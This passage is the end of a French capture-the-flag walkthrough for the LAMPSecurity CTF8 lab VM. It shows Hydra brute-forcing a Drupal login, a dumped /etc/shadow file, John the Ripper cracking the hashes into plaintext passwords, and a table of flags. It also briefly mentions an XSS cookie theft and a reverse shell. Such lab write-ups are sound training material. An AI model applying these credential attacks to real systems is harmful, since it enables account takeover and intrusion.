[DATA] max 8 tasks per 1 server, overall 8 tasks, 420 login tries (l:21/p:20), ~53 tries per task
[DATA] attacking http-post-form://192.168.56.102:80//node?destination=node:name=
^USER^&pass=^PASS^&op=Log+in&form_build_id=form-e07a3b33babb2f3209fd8516fc0415f2&form_id=user_login_block:S=Location
[80][http-post-form] host: 192.168.56.102   login: admin      password: football123
[80][http-post-form] host: 192.168.56.102   login: Barbara    password: passw0rd
[80][http-post-form] host: 192.168.56.102   login: Jim        password: letmein!
[80][http-post-form] host: 192.168.56.102   login: Steve      password: drupal
[80][http-post-form] host: 192.168.56.102   login: Sherry     password: 1website
[80][http-post-form] host: 192.168.56.102   login: Gene       password: superSun123
[80][http-post-form] host: 192.168.56.102   login: Harvey     password: MonsterDrink
[80][http-post-form] host: 192.168.56.102   login: John       password: 4summer13
[80][http-post-form] host: 192.168.56.102   login: Johnathan  password: 1loveU
[80][http-post-form] host: 192.168.56.102   login: Susan      password: BobMarley
[80][http-post-form] host: 192.168.56.102   login: Dan        password: BaseballSeason
[80][http-post-form] host: 192.168.56.102   login: George     password: 12341234
[80][http-post-form] host: 192.168.56.102   login: Jeff       password: sitepass
[80][http-post-form] host: 192.168.56.102   login: Stacey     password: Seventy70
[80][http-post-form] host: 192.168.56.102   login: Juan       password: swanson
[80][http-post-form] host: 192.168.56.102   login: Michael    password: cherry
[80][http-post-form] host: 192.168.56.102   login: Jerome     password: buddahbrother
[80][http-post-form] host: 192.168.56.102   login: Tom        password: drupalpassword
[80][http-post-form] host: 192.168.56.102   login: Xavier     password: thundercats
[80][http-post-form] host: 192.168.56.102   login: Sally      password: fantasy
1 of 1 target successfully completed, 20 valid passwords found
```

## Attaque par dictionnaire avec John The Ripper sur le fichier /etc/shadow

Pour conclure ce _walkthrough_, intéressons-nous au fichier /etc/shadow. Celui-ci contient [les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers /etc/passwd et /etc/shadow, comme suit...

```console
[root@localhost ~]# cat /etc/shadow
root:$1$.GWA7rU/$lVPNjveio2K8Hpsuk.6N4/:15861:0:99999:7:::
bin:*:15854:0:99999:7:::
daemon:*:15854:0:99999:7:::
adm:*:15854:0:99999:7:::
lp:*:15854:0:99999:7:::
sync:*:15854:0:99999:7:::
shutdown:*:15854:0:99999:7:::
halt:*:15854:0:99999:7:::
mail:*:15854:0:99999:7:::
news:*:15854:0:99999:7:::
uucp:*:15854:0:99999:7:::
operator:*:15854:0:99999:7:::
games:*:15854:0:99999:7:::
gopher:*:15854:0:99999:7:::
ftp:*:15854:0:99999:7:::
nobody:*:15854:0:99999:7:::
apache:!!:15854:0:99999:7:::
rpc:!!:15854:0:99999:7:::
rpcuser:!!:15854:0:99999:7:::
nfsnobody:!!:15854:0:99999:7:::
mailnull:!!:15854:0:99999:7:::
smmsp:!!:15854:0:99999:7:::
distcache:!!:15854:0:99999:7:::
nscd:!!:15854:0:99999:7:::
vcsa:!!:15854:0:99999:7:::
sshd:!!:15854:0:99999:7:::
webalizer:!!:15854:0:99999:7:::
dovecot:!!:15854:0:99999:7:::
squid:!!:15854:0:99999:7:::
mysql:!!:15854:0:99999:7:::
pcap:!!:15854:0:99999:7:::
ntp:!!:15854:0:99999:7:::
dbus:!!:15854:0:99999:7:::
haldaemon:!!:15854:0:99999:7:::
avahi:!!:15854:0:99999:7:::
named:!!:15854:0:99999:7:::
avahi-autoipd:!!:15854:0:99999:7:::
xfs:!!:15854:0:99999:7:::
sabayon:!!:15854:0:99999:7:::
jharraway:$1$QmYUXp3e$DLWo8Hp7O.sMNWDCNL7UL/:15855:0:99999:7:::
spinkton:$1$ujqOReXE$paM9Lo2gmdHCs.B0RC89R.:15855:0:99999:7:::
sholden:$1$dEbMtdga$ycKTjwvkJ0itX8Y.ZrYE3.:15855:0:99999:7:::
bdio:$1$7t85eaCn$E/vy2KY.s6HOxqpRsstq7.:15855:0:99999:7:::
jalderman:$1$35ETxqHg$LrEitGFy/AGaQZ0zqIXO5/:15855:0:99999:7:::
gconnor:!!:15855:0:99999:7:::
sswiney:$1$XC8fNWB1$9WFwe/YvGMZWp8rhXwurf1:15855:0:99999:7:::
dhart:$1$EGSjIMa/$xDBVVtt7cS9J/svjyun3/.:15855:0:99999:7:::
gprune:$1$9nflLusE$SS2PCLD29nSKq2sk5sDHm.:15855:0:99999:7:::
hplink:$1$5GF5JAPx$3ML0suZ7BvCdXY5n4XkT81:15855:0:99999:7:::
jgrimes:$1$eLgBAWhE$svV60siCUZfjKHEdiszM.0:15855:0:99999:7:::
shunter:$1$Tt/ZdlrY$VNqE00LGIf3iEkWvKs/tD.:15855:0:99999:7:::
jingersol:$1$Q8SgQwJQ$oziDoU20KBQOCA2SiZGv81:15855:0:99999:7:::
mswanson:$1$1Stynkar$a/gk8MinwXM1fbbddautf0:15855:0:99999:7:::
jstone:$1$tITesQJm$yxQjQrgbEBgIXbzaf6PWM1:15855:0:99999:7:::
jgoldman:$1$9RY2iB2c$LlD4Q0sKNm9xte7rE7Rwe0:15855:0:99999:7:::
tmaloney:$1$hmOHBXrr$u37LFHJCaq4Y1Z33scMyr.:15855:0:99999:7:::
xbruce:$1$BaCfmLl6$7k5Et1qS.SK3Xn5nggWT/.:15855:0:99999:7:::
sloreman:$1$3pv2eOj7$RfwB4bpc4iMmEemCxlfdR0:15855:0:99999:7:::
```

NB : pour faire le tri et obtenir uniquement les comptes avec les hashs en MD5, il est possible d'utiliser grep comme ceci.

```console
[root@localhost ~]# cat /etc/shadow | grep '\$1\$' | head -n 3
root:$1$.GWA7rU/$lVPNjveio2K8Hpsuk.6N4/:15861:0:99999:7:::
jharraway:$1$QmYUXp3e$DLWo8Hp7O.sMNWDCNL7UL/:15855:0:99999:7:::
spinkton:$1$ujqOReXE$paM9Lo2gmdHCs.B0RC89R.:15855:0:99999:7:::

[root@localhost ~]# cat /etc/shadow | grep "\\\$1\\\$" | tail -n 3
tmaloney:$1$hmOHBXrr$u37LFHJCaq4Y1Z33scMyr.:15855:0:99999:7:::
xbruce:$1$BaCfmLl6$7k5Et1qS.SK3Xn5nggWT/.:15855:0:99999:7:::
sloreman:$1$3pv2eOj7$RfwB4bpc4iMmEemCxlfdR0:15855:0:99999:7:::
```

Notre dictionnaire préféré est appelé à la rescousse : encore et toujours rockyou.txt.

```console
root@blinils:~# unshadow passwdCTF8.txt shadowCTF8.txt > etccreds.db

root@blinils:~# john etccreds.db --wordlist=../dicts/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
michelle         (jalderman)
passw0rd         (bdio)
football123      (spinkton)
letmein!         (jharraway)
changeme123      (mswanson)
Drag0n           (sholden)
thing1thing2     (root)
stupidpassword   (dhart)
12twelve12       (shunter)
georgerules      (gprune)
broney           (tmaloney)
workpass         (jgrimes)
sellsellsell     (sswiney)
1unicorn1        (sloreman)
14g 0:00:41:32 DONE (2018-12-12 12:12) 0.005616g/s 5752p/s 38354c/s 38354C/s       7..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
```

Seuls les mots de passe de jgoldman, de jingersol, de jstone et de xbruce résistent encore et toujours à l'envah\^W\^W John The Ripper.

```console
root@blinils:~# john etccreds.db
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Remaining 5 password hashes with 5 different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
MasterMaster     (hplink)
1g 0:00:01:14  3/3 0.01345g/s 9809p/s 39962c/s 39962C/s 254230..254225
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

root@blinils:~# john etccreds.db --show=left
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
jgoldman:$1$9RY2iB2c$LlD4Q0sKNm9xte7rE7Rwe0
jingersol:$1$Q8SgQwJQ$oziDoU20KBQOCA2SiZGv81
jstone:$1$tITesQJm$yxQjQrgbEBgIXbzaf6PWM1
xbruce:$1$BaCfmLl6$7k5Et1qS.SK3Xn5nggWT/.

15 password hashes cracked, 4 left
```

Encore un grand merci à [madirish2600](https://www.vulnhub.com/author/madirish2600,75/) pour avoir créé toutes ces chouettes VM LampSecurity ! Visiblement, la solution officielle proposée par l'auteur consiste à récupérer le cookie de session d'un profil administrateur Drupal, via une _Cross-Site Scripting_ dans le formulaire de contact. Une fois sur Drupal, un _[reverse shell](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/)_ doit alors être déposé pour prendre la main sur le serveur. Il est toujours intéressant de constater, tout comme les VM [Raven](/CTF-VulnLabs/raven2), que beaucoup de chemins mènent à root ! Peut-être y avait-il une autre possibilité d'exploitation, via les nombreuses connexions VNC au serveur trouvées lors du scan nmap ? Mystère.

## Bonus : les flags de LAMPSecurity: CTF8

La liste se veut exhaustive mais un flag m'aura peut-être échappé.

```console
+----------------------------------------+-----------------+------------------------------------------+ 
| flag                                   | (md5(md5(flag)) | Where?                                   | 
+----------------------------------------+-----------------+------------------------------------------+ 
| #flag#550e1bafe077ff0b0b67f4e32f29d751 | 12345678        | http://192.168.56.102/phpinfo.php        | 
| #flag#57dbe55b42b307fb4115146d239955d0 | browarprezes    | http://192.168.56.102/content/hidden     | 
| #flag#4db00563d4181dc8d1dfd3b5cd6dc708 | HeloWorld       | http://192.168.56.102/robots.txt         | 
| #flag#550e1bafe077ff0b0b67f4e32f29d751 | 12345678        | http://192.168.56.102/content/about      | 
| #flag#5e937c51b852e1ee90d42ddb5ccb8997 | misiek1         | http://192.168.56.102/webmail            | 
| #flag#5eb798d41d2e53295d34005f49113fc0 | zonk13          | FTP anonymous 192.168.56.102 (pub/key)   | 
| #flag#ab38cd01f27d48e13bbef62890c4330e | ..............  | sql> SELECT * FROM flag.flag;            | 
| #flag#fd38e201f27e98e13abcf62890c43303 | ..............  | sql> SELECT signature FROM drupal.users; | 
| #flag#motd-flag                        | NON APPLICABLE  | /etc/motd                                | 
| #flag#sendmail-banner-flag             | NON APPLICABLE  | /etc/mail/sendmail.cf                    | 
| #flag#5e937c51b852e1ee90d42ddb5ccb8997 | misiek1         | /etc/ssh/banner.txt                      | 
| #flag#5b650c18929383074fea8870d857dd2e | luj1989         | /etc/passwd                              | 
| #flag#14e1b600b1fd579f47433b88e8d85291 | 123456          | /home/bdio/flag                          | 
| #flag#228e04041ff2172704a46bf05d1025e2 | papaattia       | /home/dhart/flag                         | 
| #flag#0dd2ee4b75e2ae9e651d756a073ad845 | katarzyna       | /home/gconnor/flag                       | 
| #flag#2b0f0a14c00c8e1c4e11713ae4570d1e | marcinpl        | /home/gprune/flag                        | 
| #flag#1727712e26adec5956608218c0e1bc8d | maniek2         | /home/jalderman/flag                     | 
| #flag#129f58ad4af8f9de08bbd6bb7df22850 | M4sterYoda      | /home/jgoldman/flag                      | 
| #flag#2f485b0d23c134ae06fd913ca2774853 | 4693rr          | /home/jgrimes/flag                       | 
| #flag#0ab251c07822d26b07b88136739ae39b | tomek123k       | /home/jharraway/flag                     | 
| #flag#34b5fa40a80f8596e56a422c0e65c21f | kamikaze        | /home/jingersol/flag                     | 
| #flag#4241333025d7995adacc93eb6172a7b3 | tomeczek        | /home/jstone/flag                        | 
| #flag#3b401580fa1184c9f4e66b6beb51a68f | rafcio          | /home/mswanson/flag                      | 
| #flag#0d8763b3866033eab7414b6166689fa8 | kosakoski       | /home/sholden/flag                       | 
| #flag#307fbe82dcca96a884ab20c872422c57 | 977rJHxk        | /home/shunter/flag                       | 
| #flag#4ce2645878d776c2a4f0e3c93d2a1b32 | benecek         | /home/sloreman/flag                      | 
| #flag#0ab251c07822d26b07b88136739ae39b | tomek123k       | /home/spinkton/flag                      | 
| #flag#1d63be7ae33d0a258c1f93e61434c570 | sidsplfcr       | /home/sswiney/flag                       | 
| #flag#09fa6dc5d01788201df7b57cfc551002 | daniel          | /home/tmaloney/flag                      | 
| #flag#49fb2e659dc8e2794bd401ca5b306057 | justyna070809   | /home/xbruce/flag                        | 
| #flag#fd38e201f27e98e53abcf62890cfa303 | fbi             | /root/flag.txt                           | 
+----------------------------------------+-----------------+------------------------------------------+
```